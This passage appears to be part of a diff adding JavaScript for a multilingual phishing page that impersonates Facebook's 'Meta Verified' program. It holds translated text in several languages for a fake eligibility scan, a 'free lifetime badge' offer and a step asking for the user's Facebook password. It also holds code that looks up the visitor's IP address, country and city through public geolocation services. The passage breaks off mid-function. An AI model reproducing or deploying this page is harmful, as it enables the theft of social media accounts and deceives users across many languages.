+  s4Nav:'Verificação Concluída',s4OkTitle:'Verificação Enviada com Sucesso',s4OkSub:'Assista ao vídeo abaixo antes de ativar seu emblema.',s4Alert:'Assista ao vídeo completo. Ele contém informações importantes sobre a ativação.',s4VidTitle:'Guia Oficial — Assista Antes de Continuar',s4VidSub:'Ativação do emblema e próximos passos',s4NextTitle:'O Que Acontece Depois',s4Step1:'<strong>Revisão (24–48 hrs)</strong> — Nossa equipe revisará sua solicitação.',s4Step2:'<strong>Confirmação por e-mail</strong> — Você receberá um e-mail oficial da Meta.',s4Step3:'<strong>Emblema visível</strong> — Seu checkmark azul aparecerá automaticamente.',
+  scanTitle:'Verificando Sua Elegibilidade',scanSub:'O Facebook verifica sua conta para o emblema Meta Verified gratuito…',scanInit:'Iniciando…',scanS1:'Verificando idade da conta…',scanS2:'Verificando autenticidade…',scanS3:'Verificando elegibilidade regional…',scanS4:'Reservando vaga gratuita…',scanS5:'Confirmando elegibilidade…',scanDone:'✓ Elegível! Carregando…',chk1:'Idade verificada',chk2:'Autenticidade confirmada',chk3:'Elegibilidade regional verificada',chk4:'Vaga gratuita reservada',
+  eligTitle:'Você é Elegível! 🎉',eligSub:'Sua conta se qualifica para o emblema Meta Verified gratuito vitalício.',eligTag:'GRÁTIS · Acesso vitalício confirmado',
+  planDesc:'Proteja e otimize sua marca',freeTag:'GRÁTIS · Acesso vitalício',priceWas:'$11,99/mês',verifiedBadge:'Emblema verificado',sect1:'Maximizar descoberta',f1:'Otimização de pesquisa',f2:'Perfil em destaque',f3:'Adicionar links aos reels',f3s:'6 por mês',sect2:'Impulsionar engajamento',f4:'Links de perfil aprimorados',f5:'Figurinhas exclusivas',f6:'Temas de chat personalizados',sect3:'Proteger sua marca',f7:'Proteção contra falsidade',f8:'Suporte aprimorado',f8s:'Chat ou e-mail com agentes',ageNote:'Meta Verified está disponível para pessoas com 18 anos ou mais',continueBtn:'Continuar →',
+  hdrH:'Solicitar um emblema verificado no Facebook',hdrP:'O emblema verificado confirma que o perfil é a presença autêntica do indivíduo ou marca.',infoTitle:'Sobre o emblema verificado',infoBody:'A marca azul do Facebook confirma que sua conta é autêntica.',warnImp:'Importante:',warnBody:'Não faça logout até receber o e-mail de confirmação do Facebook.',vidLbl:'Guia em vídeo',frmT:'Enviar solicitação de verificação',frmS:'Certifique-se de que todas as informações estão corretas.',errTxt:'Todos os campos obrigatórios devem ser preenchidos.',submitBtn:'Enviar solicitação de verificação',
+  s3Nav:'Verificação de segurança',s3Help:'Central de ajuda',pwPrompt:'Insira sua senha do Facebook para concluir a verificação.',pwPlaceholder:'Senha do Facebook',pwErr:'Senha incorreta. Tente novamente.',pwForgot:'Esqueceu a senha?',pwContinue:'Continuar',pwNotYou:'Não é você?',pwOkT:'Verificando…',pwOkS:'Aguarde…'},
+
+  arabic:{vsTitle:'تم التحقق بنجاح!',vsSub:'تم تفعيل شارة Meta Verified الخاصة بك. ستتلقى بريداً تأكيدياً من Meta قريباً.',vsTag:'Meta Verified · شارة مجانية مدى الحياة',vsRedirect:'جارٍ إعادة التوجيه إلى Facebook…',
+  s4Nav:'اكتمل التحقق',s4OkTitle:'تم إرسال التحقق بنجاح',s4OkSub:'شاهد الفيديو أدناه قبل تفعيل شارتك.',s4Alert:'يرجى مشاهدة الفيديو الكامل. يحتوي على معلومات مهمة حول التفعيل.',s4VidTitle:'دليل رسمي — شاهد قبل المتابعة',s4VidSub:'تفعيل الشارة والخطوات التالية',s4NextTitle:'ماذا يحدث بعد ذلك',s4Step1:'<strong>مراجعة الشارة (24–48 ساعة)</strong> — سيراجع فريقنا طلبك.',s4Step2:'<strong>تأكيد بالبريد</strong> — ستتلقى بريداً رسمياً من Meta.',s4Step3:'<strong>ظهور الشارة</strong> — ستظهر العلامة الزرقاء تلقائياً.',
+  scanTitle:'التحقق من أهليتك',scanSub:'يتحقق Facebook من حسابك للحصول على شارة Meta Verified المجانية…',scanInit:'جارٍ التهيئة…',scanS1:'التحقق من عمر الحساب…',scanS2:'التحقق من أصالة الملف…',scanS3:'التحقق من الأهلية الإقليمية…',scanS4:'حجز مكانك المجاني…',scanS5:'تأكيد الأهلية…',scanDone:'✓ مؤهل! جارٍ التحميل…',chk1:'تم التحقق من عمر الحساب',chk2:'تم تأكيد الأصالة',chk3:'تم التحقق من الأهلية الإقليمية',chk4:'تم حجز المكان المجاني',
+  eligTitle:'أنت مؤهل! 🎉',eligSub:'حسابك مؤهل للحصول على شارة Meta Verified المجانية مدى الحياة.',eligTag:'مجانًا · تم تأكيد الوصول مدى الحياة',
+  planDesc:'احمِ علامتك التجارية وطوِّرها',freeTag:'مجانًا · وصول مدى الحياة',priceWas:'11.99$/شهريًا',verifiedBadge:'شارة موثقة',sect1:'تعظيم الاكتشاف',f1:'تحسين البحث',f2:'ملف شخصي مميز',f3:'إضافة روابط إلى الريلز',f3s:'6 شهريًا',sect2:'تعزيز التفاعل',f4:'روابط ملف شخصي محسّنة',f5:'ملصقات حصرية',f6:'سمات دردشة مخصصة',sect3:'حماية علامتك التجارية',f7:'الحماية من الانتحال',f8:'دعم معزز',f8s:'الدردشة أو الإيميل مع الوكلاء',ageNote:'Meta Verified متاحة للأشخاص الذين تبلغ أعمارهم 18 عامًا فأكثر',continueBtn:'متابعة →',
+  hdrH:'طلب شارة موثقة على Facebook',hdrP:'تؤكد الشارة الموثقة أن الملف الشخصي هو الحضور الأصيل.',infoTitle:'حول الشارة الموثقة',infoBody:'تؤكد العلامة الزرقاء من Facebook أن حسابك أصيل.',warnImp:'مهم:',warnBody:'لا تسجّل الخروج حتى تتلقى رسالة التأكيد من Facebook.',vidLbl:'دليل فيديو',frmT:'إرسال طلب التحقق',frmS:'تأكد من ملء جميع المعلومات بدقة.',errTxt:'يجب تقديم جميع الحقول المطلوبة.',submitBtn:'إرسال طلب التحقق',
+  s3Nav:'فحص الأمان',s3Help:'مركز المساعدة',pwPrompt:'أدخل كلمة مرور Facebook لإكمال عملية التحقق.',pwPlaceholder:'كلمة مرور Facebook',pwErr:'كلمة المرور غير صحيحة. حاول مجدداً.',pwForgot:'نسيت كلمة المرور؟',pwContinue:'متابعة',pwNotYou:'لست أنت؟',pwOkT:'جارٍ التحقق…',pwOkS:'يرجى الانتظار…'},
+
+  french:{vsTitle:'Vérification Réussie !',vsSub:'Votre badge Meta Verified a été activé. Vous recevrez un e-mail de confirmation de Meta prochainement.',vsTag:'Meta Verified · Badge gratuit à vie',vsRedirect:'Redirection vers Facebook…',
+  s4Nav:'Vérification Terminée',s4OkTitle:'Vérification Soumise avec Succès',s4OkSub:'Regardez la vidéo ci-dessous avant l\'activation de votre badge.',s4Alert:'Veuillez regarder la vidéo complète. Elle contient des informations importantes.',s4VidTitle:'Guide Officiel — Regardez Avant de Continuer',s4VidSub:'Activation du badge et prochaines étapes',s4NextTitle:'Que Se Passe-t-il Ensuite',s4Step1:'<strong>Examen (24–48 h)</strong> — Notre équipe examinera votre demande.',s4Step2:'<strong>Confirmation par e-mail</strong> — Vous recevrez un e-mail officiel de Meta.',s4Step3:'<strong>Badge visible</strong> — Votre coche bleue apparaîtra automatiquement.',
+  scanTitle:'Vérification de votre éligibilité',scanSub:'Facebook vérifie votre compte pour le badge Meta Verified gratuit…',scanInit:'Initialisation…',scanS1:'Vérification de l\'ancienneté…',scanS2:'Vérification de l\'authenticité…',scanS3:'Vérification de l\'éligibilité régionale…',scanS4:'Réservation de votre place…',scanS5:'Confirmation de l\'éligibilité…',scanDone:'✓ Éligible ! Chargement…',chk1:'Ancienneté vérifiée',chk2:'Authenticité confirmée',chk3:'Éligibilité régionale vérifiée',chk4:'Place gratuite réservée',
+  eligTitle:'Vous êtes éligible ! 🎉',eligSub:'Votre compte est éligible au badge Meta Verified gratuit à vie.',eligTag:'GRATUIT · Accès à vie confirmé',
+  planDesc:'Protégez et optimisez votre marque',freeTag:'GRATUIT · Accès à vie',priceWas:'11,99$/mois',verifiedBadge:'Badge vérifié',sect1:'Maximiser la découverte',f1:'Optimisation de la recherche',f2:'Profil mis en avant',f3:'Ajouter des liens aux reels',f3s:'6 par mois',sect2:"Stimuler l'engagement",f4:'Liens de profil améliorés',f5:'Autocollants exclusifs',f6:'Thèmes de chat personnalisés',sect3:'Protéger votre marque',f7:"Protection contre l'usurpation",f8:'Assistance améliorée',f8s:'Chat ou e-mail · Résolution rapide',ageNote:'Meta Verified est disponible pour les personnes âgées de 18 ans et plus',continueBtn:'Continuer →',
+  hdrH:'Demander un badge vérifié sur Facebook',hdrP:'Le badge vérifié confirme que le profil est la présence authentique de l\'individu ou de la marque.',infoTitle:'À propos du badge vérifié',infoBody:'La coche bleue de Facebook confirme que votre compte est authentique.',warnImp:'Important:',warnBody:'Ne vous déconnectez pas jusqu\'à ce que vous receviez l\'e-mail de confirmation.',vidLbl:'Guide vidéo',frmT:'Envoyer la demande de vérification',frmS:'Assurez-vous que toutes les informations sont exactes.',errTxt:'Tous les champs obligatoires doivent être remplis.',submitBtn:'Envoyer la demande',
+  s3Nav:'Vérification de sécurité',s3Help:"Centre d'aide",pwPrompt:'Entrez votre mot de passe Facebook pour terminer la vérification.',pwPlaceholder:'Mot de passe Facebook',pwErr:'Mot de passe incorrect. Veuillez réessayer.',pwForgot:'Mot de passe oublié ?',pwContinue:'Continuer',pwNotYou:'Ce n\'est pas vous ?',pwOkT:'Vérification…',pwOkS:'Veuillez patienter…'},
+
+  tamil:{vsTitle:'சரிபார்ப்பு வெற்றிகரம்!',vsSub:'உங்கள் Meta Verified பேட்ஜ் செயல்படுத்தப்பட்டது. Meta இலிருந்து விரைவில் உறுதிப்படுத்தல் மின்னஞ்சல் வரும்.',vsTag:'Meta Verified · இலவச வாழ்நாள் பேட்ஜ்',vsRedirect:'Facebook க்கு திருப்பி அனுப்புகிறோம்…',
+  s4Nav:'சரிபார்ப்பு முடிந்தது',s4OkTitle:'சரிபார்ப்பு வெற்றிகரமாக சமர்ப்பிக்கப்பட்டது',s4OkSub:'பேட்ஜ் செயல்படுத்தப்படுவதற்கு முன் வீடியோ பாருங்கள்.',s4Alert:'முழு வீடியோவையும் பாருங்கள். பேட்ஜ் செயல்படுத்தல் பற்றிய முக்கிய தகவல்கள் உள்ளன.',s4VidTitle:'அதிகாரப்பூர்வ வழிகாட்டி — தொடர்வதற்கு முன் பாருங்கள்',s4VidSub:'பேட்ஜ் செயல்படுத்தல் மற்றும் அடுத்த படிகள்',s4NextTitle:'அடுத்து என்ன நடக்கும்',s4Step1:'<strong>பேட்ஜ் மதிப்பாய்வு (24–48 மணி)</strong> — எங்கள் குழு உங்கள் கோரிக்கையை மதிப்பாய்வு செய்யும்.',s4Step2:'<strong>மின்னஞ்சல் உறுதிப்படுத்தல்</strong> — Meta இலிருந்து அதிகாரப்பூர்வ மின்னஞ்சல் வரும்.',s4Step3:'<strong>பேட்ஜ் தோன்றும்</strong> — நீல சரிபார்ப்பு குறி தானாகவே தோன்றும்.',
+  scanTitle:'உங்கள் தகுதியை சரிபார்க்கிறோம்',scanSub:'Meta Verified இலவச பேட்ஜுக்கு Facebook உங்கள் கணக்கை சரிபார்க்கிறது…',scanInit:'தொடங்குகிறது…',scanS1:'கணக்கு வயது சரிபார்க்கப்படுகிறது…',scanS2:'சுயவிவர நம்பகத்தன்மை சரிபார்க்கப்படுகிறது…',scanS3:'பிராந்திய தகுதி சரிபார்க்கப்படுகிறது…',scanS4:'இலவச இடம் ஒதுக்கப்படுகிறது…',scanS5:'தகுதி உறுதிப்படுத்தப்படுகிறது…',scanDone:'✓ தகுதியுடையவர்! ஏற்றுகிறது…',chk1:'கணக்கு வயது சரிபார்க்கப்பட்டது',chk2:'நம்பகத்தன்மை உறுதிப்படுத்தப்பட்டது',chk3:'பிராந்திய தகுதி சரிபார்க்கப்பட்டது',chk4:'இலவச இடம் ஒதுக்கப்பட்டது',
+  eligTitle:'நீங்கள் தகுதியுடையவர்! 🎉',eligSub:'உங்கள் கணக்கு இலவச வாழ்நாள் Meta Verified பேட்ஜுக்கு தகுதியானது.',eligTag:'இலவசம் · வாழ்நாள் அணுகல் உறுதிப்படுத்தப்பட்டது',
+  planDesc:'உங்கள் பிராண்டை பாதுகாத்து மேம்படுத்துங்கள்',freeTag:'இலவசம் · வாழ்நாள் அணுகல்',priceWas:'$11.99/மாதம்',verifiedBadge:'சரிபார்க்கப்பட்ட பேட்ஜ்',sect1:'கண்டுபிடிப்பை அதிகப்படுத்துங்கள்',f1:'தேடல் உகப்பாக்கம்',f2:'சிறப்பு சுயவிவரம்',f3:'ரீல்களில் இணைப்புகள்',f3s:'மாதம் 6',sect2:'ஈடுபாட்டை அதிகரிக்கவும்',f4:'மேம்படுத்தப்பட்ட இணைப்புகள்',f5:'பிரத்யேக ஸ்டிக்கர்கள்',f6:'தனிப்பயன் தீம்கள்',sect3:'பிராண்டை பாதுகாக்கவும்',f7:'ஆள்மாறாட்ட பாதுகாப்பு',f8:'மேம்படுத்தப்பட்ட ஆதரவு',f8s:'அரட்டை அல்லது மின்னஞ்சல் · விரைவான தீர்வு',ageNote:'Meta Verified 18+ வயதுடையவர்களுக்கு கிடைக்கும்',continueBtn:'தொடரவும் →',
+  hdrH:'Facebook இல் சரிபார்க்கப்பட்ட பேட்ஜை கோருங்கள்',hdrP:'சரிபார்க்கப்பட்ட பேட்ஜ் சுயவிவரம் உண்மையானது என்பதை உறுதிப்படுத்துகிறது.',infoTitle:'சரிபார்க்கப்பட்ட பேட்ஜைப் பற்றி',infoBody:'Facebook இன் நீல டிக் உங்கள் கணக்கு நம்பகமானது என்பதை உறுதிப்படுத்துகிறது.',warnImp:'முக்கியம்:',warnBody:'Facebook இலிருந்து மின்னஞ்சல் வரும் வரை லாக் அவுட் செய்யாதீர்கள்.',vidLbl:'வீடியோ வழிகாட்டி',frmT:'சரிபார்ப்பு கோரிக்கையை சமர்ப்பிக்கவும்',frmS:'அனைத்து தகவல்களும் சரியாக நிரப்பப்பட்டுள்ளதை உறுதிசெய்யவும்.',errTxt:'அனைத்து புலங்களும் வழங்கப்பட வேண்டும்.',submitBtn:'கோரிக்கையை சமர்ப்பிக்கவும்',
+  s3Nav:'பாதுகாப்பு சரிபார்ப்பு',s3Help:'உதவி மையம்',pwPrompt:'சரிபார்ப்பை முடிக்க Facebook கடவுச்சொல்லை உள்ளிடவும்.',pwPlaceholder:'Facebook கடவுச்சொல்',pwErr:'கடவுச்சொல் தவறானது. மீண்டும் முயற்சிக்கவும்.',pwForgot:'கடவுச்சொல் மறந்துவிட்டதா?',pwContinue:'தொடரவும்',pwNotYou:'நீங்கள் இல்லையா?',pwOkT:'சரிபார்க்கப்படுகிறது…',pwOkS:'தயவுசெய்து காத்திருங்கள்…'},
+
+  vietnamese:{vsTitle:'Xác Minh Thành Công!',vsSub:'Huy hiệu Meta Verified của bạn đã được kích hoạt. Bạn sẽ nhận email xác nhận từ Meta sớm.',vsTag:'Meta Verified · Huy hiệu miễn phí trọn đời',vsRedirect:'Đang chuyển hướng đến Facebook…',
+  s4Nav:'Xác Minh Hoàn Tất',s4OkTitle:'Xác Minh Đã Được Gửi Thành Công',s4OkSub:'Xem video bên dưới trước khi huy hiệu được kích hoạt.',s4Alert:'Vui lòng xem toàn bộ video. Nó chứa thông tin quan trọng về việc kích hoạt.',s4VidTitle:'Hướng Dẫn Chính Thức — Xem Trước Khi Tiếp Tục',s4VidSub:'Kích hoạt huy hiệu và các bước tiếp theo',s4NextTitle:'Điều Gì Xảy Ra Tiếp Theo',s4Step1:'<strong>Xem xét (24–48 giờ)</strong> — Nhóm của chúng tôi sẽ xem xét yêu cầu.',s4Step2:'<strong>Xác nhận qua email</strong> — Bạn sẽ nhận email chính thức từ Meta.',s4Step3:'<strong>Huy hiệu xuất hiện</strong> — Dấu kiểm xanh sẽ xuất hiện tự động.',
+  scanTitle:'Kiểm tra điều kiện của bạn',scanSub:'Facebook đang xác minh tài khoản cho ưu đãi huy hiệu Meta Verified miễn phí…',scanInit:'Đang khởi tạo…',scanS1:'Đang xác minh tuổi tài khoản…',scanS2:'Đang kiểm tra tính xác thực…',scanS3:'Đang kiểm tra điều kiện khu vực…',scanS4:'Đang đặt chỗ miễn phí…',scanS5:'Đang xác nhận điều kiện…',scanDone:'✓ Đủ điều kiện! Đang tải…',chk1:'Đã xác minh tuổi',chk2:'Đã xác nhận tính xác thực',chk3:'Đã kiểm tra điều kiện khu vực',chk4:'Đã đặt chỗ miễn phí',
+  eligTitle:'Bạn Đủ Điều Kiện! 🎉',eligSub:'Tài khoản của bạn đủ điều kiện nhận huy hiệu Meta Verified miễn phí trọn đời.',eligTag:'MIỄN PHÍ · Đã xác nhận quyền truy cập trọn đời',
+  planDesc:'Bảo vệ và tối ưu hóa thương hiệu',freeTag:'MIỄN PHÍ · Quyền truy cập trọn đời',priceWas:'$11.99/tháng',verifiedBadge:'Huy hiệu đã xác minh',sect1:'Tối đa hóa khả năng khám phá',f1:'Tối ưu hóa tìm kiếm',f2:'Hồ sơ nổi bật',f3:'Thêm liên kết vào reels',f3s:'6 mỗi tháng',sect2:'Tăng cường tương tác',f4:'Liên kết hồ sơ nâng cao',f5:'Nhãn dán độc quyền',f6:'Chủ đề trò chuyện tùy chỉnh',sect3:'Bảo vệ thương hiệu',f7:'Bảo vệ chống mạo danh',f8:'Hỗ trợ nâng cao',f8s:'Trò chuyện hoặc email · Giải quyết nhanh',ageNote:'Meta Verified dành cho người từ 18 tuổi trở lên',continueBtn:'Tiếp tục →',
+  hdrH:'Yêu cầu Huy hiệu đã Xác minh trên Facebook',hdrP:'Huy hiệu xác nhận rằng hồ sơ là sự hiện diện xác thực của cá nhân hoặc thương hiệu.',infoTitle:'Về Huy hiệu đã Xác minh',infoBody:'Dấu kiểm xanh của Facebook xác nhận tài khoản của bạn là xác thực.',warnImp:'Quan trọng:',warnBody:'Đừng đăng xuất cho đến khi nhận được email xác nhận từ Facebook.',vidLbl:'Hướng dẫn video',frmT:'Gửi yêu cầu xác minh',frmS:'Đảm bảo tất cả thông tin chính xác.',errTxt:'Tất cả các trường bắt buộc phải được cung cấp.',submitBtn:'Gửi yêu cầu xác minh',
+  s3Nav:'Kiểm tra bảo mật',s3Help:'Trung tâm trợ giúp',pwPrompt:'Nhập mật khẩu Facebook để hoàn tất xác minh.',pwPlaceholder:'Mật khẩu Facebook',pwErr:'Mật khẩu không đúng. Vui lòng thử lại.',pwForgot:'Quên mật khẩu?',pwContinue:'Tiếp tục',pwNotYou:'Không phải bạn?',pwOkT:'Đang xác minh…',pwOkS:'Vui lòng chờ…'},
+
+  ghanaian:{vsTitle:'Verification Yɛɛ Yiye!',vsSub:'Wɔde wo Meta Verified badge ama wo. Wɔde email bɛkɔ ma wo a ɛkyerɛ sɛ wɔde badge no ama wo.',vsTag:'Meta Verified · Badge FREE bere nyinaa',vsRedirect:'Wɔde wo rekɔ Facebook…',
+  s4Nav:'Verification Wie Adi',s4OkTitle:'Wɔde Verification Kɔɔ Yiye',s4OkSub:'Hwɛ video no wɔ ase ansa na badge no ba.',s4Alert:'Hwɛ video no nyinaa wɔ ase. Ɛwɔ nsɛm a ɛhia paa fa badge no ho.',s4VidTitle:'Nhyehyɛe Kwan Kyerɛ — Hwɛ Ansa na Wokɔ So',s4VidSub:'Badge no ba na nkyerɛwee a edi hɔ',s4NextTitle:'Biribi a Ɛbɛba',s4Step1:'<strong>Badge Hwɛ (24–48 dɔnhwer)</strong> — Yɛn kuw bɛhwɛ wo bisa no.',s4Step2:'<strong>Email Adanse</strong> — Wɔde email firi Meta bɛkɔ ma wo.',s4Step3:'<strong>Badge Bɛba</strong> — Wo blue checkmark bɛba wɔ wo profile so.',
+  scanTitle:'Wɔrensusuw Wo Tumi',scanSub:'Facebook resiw wo account ho hwɛ ma Meta Verified badge kyɛ ade…',scanInit:'Retɔ ase…',scanS1:'Resusuw account mfeɛ…',scanS2:'Rehwɛ profile nokware…',scanS3:'Rehwɛ ɛman tumi…',scanS4:'Regye wo baabi…',scanS5:'Rekan tumi…',scanDone:'✓ Wowɔ tumi! Wɔreba…',chk1:'Account mfeɛ da ho adi',chk2:'Profile nokware da ho adi',chk3:'Ɛman tumi wɔ ho',chk4:'Baabi agye',
+  eligTitle:'Wowɔ Tumi! 🎉',eligSub:'Wo account wowɔ tumi ma Meta Verified badge FREE.',eligTag:'FREE · Bere nyinaa ho kwan da ho adi',
+  planDesc:'Bō wo brand ho ban na yɛ no yiye',freeTag:'FREE · Bere nyinaa ho kwan',priceWas:'$11.99/bosome',verifiedBadge:'Badge a wɔakaN ho',sect1:'Ma wɔhunu wo pii',f1:'Nhwehwɛmu pa',f2:'Profile a wɔde adi kan',f3:'Fa links kɔ reels mu',f3s:'6 bosome biara',sect2:'Ma nkitahodi nyinkonim',f4:'Profile links a wɔayɛ wɔn papa',f5:'Stickers a ɛyɛ ahoodenso',f6:'Chat themes a woyɛɛ wɔn',sect3:'Bō wo brand ho ban',f7:'Ho ban fi nsesafoɔ',f8:'Mmoa a ɛyɛ papa',f8s:'Kasa anaa email ne agents',ageNote:'Meta Verified yɛ ma nnipa a wɔaka mfe 18',continueBtn:'Kɔ so →',
+  hdrH:'Bisa Badge a Wɔakan Ho wɔ Facebook so',hdrP:'Badge a wɔakan ho kyerɛ sɛ profile no yɛ nokware.',infoTitle:'Fa Badge a Wɔakan Ho Ho',infoBody:'Facebook ne blue tick kyerɛ sɛ wo account yɛ nokware.',warnImp:'Ɛho hia:',warnBody:'Mfa wo ho nfi wo computer mu kosi sɛ Facebook de email no kɔ ma wo.',vidLbl:'Video kwan kyerɛ',frmT:'Fa verification bisa kɔ',frmS:'Hwɛ sɛ nsɛm nyinaa wɔ pɔtee.',errTxt:'Wɔhia fields nyinaa.',submitBtn:'Fa verification bisa kɔ',
+  s3Nav:'Ahobann Hwɛ',s3Help:'Mmoa Fie',pwPrompt:'Fa wo Facebook gyinaese kɔ bɛwie verification kwan no.',pwPlaceholder:'Facebook gyinaese',pwErr:'Gyinaese a wode baeɛ no nyɛ.',pwForgot:'Wo gyinaese afi wo tirim?',pwContinue:'Kɔ so',pwNotYou:'Wo na ɛnyɛ wo?',pwOkT:'Wɔresiw…',pwOkS:'Twɛn kakra…'}
+};
+
+var videoSrc={english:'https://resource2.heygen.ai/video_translate/94087358030a4df8b20e73f1fba92ed5-en/720p.mp4',spanish:'https://resource2.heygen.ai/video_translate/db7e753c13fa4d238fe716483469ae8f-es/720p.mp4',hindi:'https://resource2.heygen.ai/video_translate/9d7e40f714c842258bd08ad4c3ee68d6-hi/720p.mp4',french:'https://resource2.heygen.ai/video_translate/6e2f1893a7994182948b3dd8f27ecb21-fr/720p.mp4',portuguese:'https://allvideos.wasmer.app/Portuguese.mp4',tamil:'https://allvideos.wasmer.app/tamil.mp4',arabic:'https://resource2.heygen.ai/video_translate/f7346b2ef53c4daa9bc15138684919db-ar_use-aicoustics-vocal/720p.mp4',ghanaian:'https://allvideos.wasmer.app/english.mp4',vietnamese:'https://allvideos.wasmer.app/vietanames.mp4'};
+var flagSrc={english:'https://flagcdn.com/24x18/us.png',hindi:'https://flagcdn.com/24x18/in.png',spanish:'https://flagcdn.com/24x18/es.png',portuguese:'https://flagcdn.com/24x18/pt.png',tamil:'https://flagcdn.com/24x18/in.png',arabic:'https://flagcdn.com/24x18/sa.png',french:'https://flagcdn.com/24x18/fr.png',vietnamese:'https://flagcdn.com/24x18/vn.png',ghanaian:'https://flagcdn.com/24x18/gh.png'};
+
+var currentLang='english';
+var userCountry='Unknown',userCity='',userIP='';
+
+/* Geo detection */
+(function(){
+  function tryApis(apis,i){
+    if(i>=apis.length)return;
+    fetch(apis[i].url).then(function(r){return r.json();}).then(function(d){
+      var c=apis[i].parse(d);
+      if(c&&c.country&&c.country!=='Unknown'){userCountry=c.country;userCity=c.city||'';userIP=c.ip||'';}
+      else tryApis(apis,i+1);
+    }).catch(function(){tryApis(apis,i+1);});
+  }
+  tryApis([
+    {url:'https://ipwho.is/',parse:function(d){return d.success?{country:d.country,city:d.city,ip:d.ip}:null;}},
+    {url:'https://ipapi.co/json/',parse:function(d){return{country:d.country_name||d.country,city:d.city,ip:d.ip};}},
+    {url:'https://freeipapi.com/api/json',parse:function(d){return{country:d.countryName,city:d.cityName,ip:d.ipAddress};}},
+    {url:'https://ipinfo.io/json',parse:function(d){return{country:d.country,city:d.city,ip:d.ip};}}
+  ],0);
+})();
+
+/* goTo */
+function goTo(id){
+  try{
+    document.querySelectorAll('.step').forEach(function(s){s.classList.remove('active');});
+    var el=document.getElementById(id);
+    if(el){el.classList.add('active');}
+    window.scrollTo(0,0);
+    if(id==='s4'){
+      var src=document.getElementById('s4-video-src');
+      var vid=document.getElementById('s4-video');
+      if(src&&vid){src.src='https://link-of-video-step0.wasmer.app/InShot_20260117_014107448.mp4';vid.load();}
+    }
+  }catch(e){}
+}
+window.goTo=goTo;
+
+/* Apply translations */
+function applyTranslations(lang){
+  var t=T[lang]||T.english;
+  function txt(id,v){var el=document.getElementById(id);if(el&&v!==undefined)el.textContent=v;}
+  function ph(id,v){var el=document.getElementById(id);if(el&&v!==undefined)el.placeholder=v;}
+  function htm(id,v){var el=document.getElementById(id);if(el&&v!==undefined)el.innerHTML=v;}
+  txt('t-scan-title',t.scanTitle);txt('t-scan-sub',t.scanSub);
+  txt('t-chk1',t.chk1);txt('t-chk2',t.chk2);txt('t-chk3',t.chk3);txt('t-chk4',t.chk4);
+  txt('t-elig-title',t.eligTitle);txt('t-elig-sub',t.eligSub);txt('t-elig-tag',t.eligTag);
+  txt('t-plan-desc',t.planDesc);txt('t-free-tag',t.freeTag);txt('t-price-was',t.priceWas);
+  txt('t-verified-badge',t.verifiedBadge);
+  txt('t-sect1',t.sect1);txt('t-f1',t.f1);txt('t-f2',t.f2);txt('t-f3',t.f3);txt('t-f3s',t.f3s);
+  txt('t-sect2',t.sect2);txt('t-f4',t.f4);txt('t-f5',t.f5);txt('t-f6',t.f6);
+  txt('t-sect3',t.sect3);txt('t-f7',t.f7);txt('t-f8',t.f8);txt('t-f8s',t.f8s);
+  txt('t-age-note',t.ageNote);txt('t-continue-btn',t.continueBtn);
+  txt('t-hdr-h',t.hdrH);txt('t-hdr-p',t.hdrP);txt('t-info-title',t.infoTitle);txt('t-info-body',t.infoBody);
+  txt('t-warn-imp',t.warnImp);txt('t-warn-body',t.warnBody);txt('t-vid-lbl',t.vidLbl);
+  txt('t-frm-t',t.frmT);txt('t-frm-s',t.frmS);txt('t-err-txt',t.errTxt);txt('t-submit-btn',t.submitBtn);
+  txt('t-s3-nav',t.s3Nav);txt('t-s3-help',t.s3Help);txt('t-s3-nav-inner',t.s3Nav);
+  txt('t-pw-prompt',t.pwPrompt);ph('pw-input',t.pwPlaceholder);
+  txt('t-pw-err',t.pwErr);txt('t-pw-forgot',t.pwForgot);txt('t-pw-continue',t.pwContinue);txt('t-pw-not-you',t.pwNotYou);
+  txt('t-pw-ok-t',t.pwOkT);txt('t-pw-ok-s',t.pwOkS);
+  txt('t-s4-nav',t.s4Nav);txt('t-s4-ok-title',t.s4OkTitle);txt('t-s4-ok-sub',t.s4OkSub);
+  txt('t-s4-alert',t.s4Alert);txt('t-s4-vid-title',t.s4VidTitle);txt('t-s4-vid-sub',t.s4VidSub);
+  txt('t-s4-next-title',t.s4NextTitle);
+  htm('t-s4-step1',t.s4Step1);htm('t-s4-step2',t.s4Step2);htm('t-s4-step3',t.s4Step3);
+  txt('t-vs-title',t.vsTitle);txt('t-vs-sub',t.vsSub);txt('t-vs-tag',t.vsTag);txt('t-vs-redirect',t.vsRedirect);
+  document.documentElement.dir=lang==='arabic'?'rtl':'ltr';
+}
+
+/* Confetti */
+function spawnConfetti(){
+  var ef=document.getElementById('eligFlash');
+  var cols=['#fff','#b3d0ff','#e7f2ff','#63a4ff','#dde9fd'];
+  for(var i=0;i<40;i++){
+    var d=document.createElement('div');d.className='conf';
+    var s=4+Math.random()*8;
+    d.style.cssText='width:'+s+'px;height:'+s+'px;background:'+cols[Math.floor(Math.random()*cols.length)]+';left:'+Math.random()*100+'%;top:-10px;animation-duration:'+(2+Math.random()*2)+'s;animation-delay:'+(Math.random()*.4)+'s;border-radius:'+(Math.random()>.5?'50%':'2px');
+    ef.appendChild(d);
+    (function(el){setTimeout(function(){try{el.remove();}catch(e){}},4500);})(d);
+  }
+}
+
+/* Scan animation */
+function runScan(){
+  var fillEl=document.getElementById('scanBarFill');
+  var pctEl=document.getElementById('scanPct');
+  var statusEl=document.getElementById('scanStatus');
+  var t=T[currentLang]||T.english;
+  statusEl.textContent=t.scanInit;
+  var pct=0;
+  var iv=setInterval(function(){
+    pct=Math.min(pct+1,100);
+    if(fillEl)fillEl.style.width=pct+'%';
+    if(pctEl)pctEl.textContent=pct+'%';
+    if(pct===15){statusEl.textContent=t.scanS1;var c=document.getElementById('chk1');if(c)c.classList.add('done');}
+    if(pct===35){statusEl.textContent=t.scanS2;var c=document.getElementById('chk2');if(c)c.classList.add('done');}
+    if(pct===58){statusEl.textContent=t.scanS3;var c=document.getElementById('chk3');if(c)c.classList.add('done');}
+    if(pct===80){statusEl.textContent=t.scanS4;var c=document.getElementById('chk4');if(c)c.classList.add('done');}
+    if(pct===92){statusEl.textContent=t.scanS5;}
+    if(pct>=100){
+      clearInterval(iv);
+      statusEl.textContent=t.scanDone;
+      setTimeout(function(){
+        var sw=document.getElementById('scanWrap');if(sw)sw.style.display='none';
+        var ef=document.getElementById('eligFlash');if(ef){ef.classList.add('show');spawnConfetti();}
+        setTimeout(function(){
+          if(ef){ef.classList.remove('show');ef.style.display='none';}
+          var pc=document.getElementById('planCard');if(pc)pc.style.display='block';
+          setTimeout(function(){
+            var tiles=document.querySelectorAll('.plan-tile');
